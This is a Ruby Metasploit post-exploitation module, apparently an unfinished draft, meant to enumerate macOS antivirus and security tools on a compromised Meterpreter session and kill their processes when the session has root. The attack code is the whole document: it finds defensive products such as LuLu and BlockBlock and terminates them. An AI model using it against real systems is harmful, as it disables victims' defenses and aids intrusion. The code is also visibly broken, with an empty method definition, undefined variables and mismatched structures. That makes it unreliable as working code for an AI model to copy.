##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Process
  include Msf::Post::File
  include Msf::Post::OSX::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate, Disable and Uninstall OSX AV Products',
        'Description' => %q{
          This module enumerates OSX systems for the presence of antivirus products. Disabling and uninstalling AV applications
          is supported so long as the user has root privilleges. Objective Cee, BitDefender, and CleanMyMac are all supported. Enumeration 
          for additional products is possible through setting the CUSTOM_FILE option. 
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'gardnerapp', 'cdelafuente-r7' ],
        'Platform' => [ 'osx' ],
        'SessionTypes' => 'meterpreter', 
        'References' => [
          ['URL', 'https://objective-see.org/tools.html']
        ]
      )

  )
    register_options(
      [
        OptBool.new('KILL_PROCESSES', [
          true, 'Kills processes of installed AV  products. Requires root privileges.', false
        ]),
        OptBool.new('UNINSTALL', [
          true, 'Uninstall AV products. Only supported for default product list.', false
        ]),
        OptString.new('CUSTOM_FILE', 
                      true, ['A custom list of products to enumerate the system for. Each item should include the full path and be followed by
        a newline.', '']),
      ]
    )
  end

  # Determine which products are installed and their pid if any
  # products arg is in array w each elem in the format of {:name => 'AV Name', :path => '/Applications/AV Name.app'}
  # returns a hash with keys of :name, :path, and :pid
  def enumerate(products)
    installed = []
    products.each do |prod| 
      if directory? prod[:path]
        prod[:pid] = []
        installed << prod
        @processes.each {|process| prod[:pid] << process[:pid] if process[:name].include? prod[:name].split(' ')[0]}
      end 
    end 
    installed
  end

  def fail_no_root
    unless is_root?
      fail_with(Failure::BadConfig,
                'The current session is not root. Please escalate the session and rerun the module.')
    end
  end

  def objective_see_products
    ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight'].map! {|p| "/Applications/#{p}.app"}
  end 

  def 

  def run
    # TODO test, get more products. Test custom file, reading file. 
    print_status('Retrieving process list...')
    @processes = get_processes

    print_status('Enumerating AV products...')

    if !datastore['CUSTOM_FILE'].empty?
      # prods = File.read(datastore['CUSTOM_FILE']) 
      # Might need to parse prods and err check 
    else 
      prods = objective_see_products # this will change in the future
    end 

    installed = enumerate(prods)

    if prods.empty?
      print_error('No AVproducts were found to be installed on the system.')
    else
      print_good('The following AV products were found installed on the system:')
      prods.each { |prod| print_good("Found #{prod.name} with pid #{prod.pids.inspect}") }
    end

    installed_product = { 'installed products' => products.map(&:name).join(', ') }
    report_note(host: target_host, type: 'osx.antivirus', 
                data: installed_product, update: :unique_data)

    if datastore['KILL_PROCESSES']
      fail_no_root
      products.each do |prod|
        prod[:pid].each {|pid| kill_process pid}
      end 
    end
  end
end
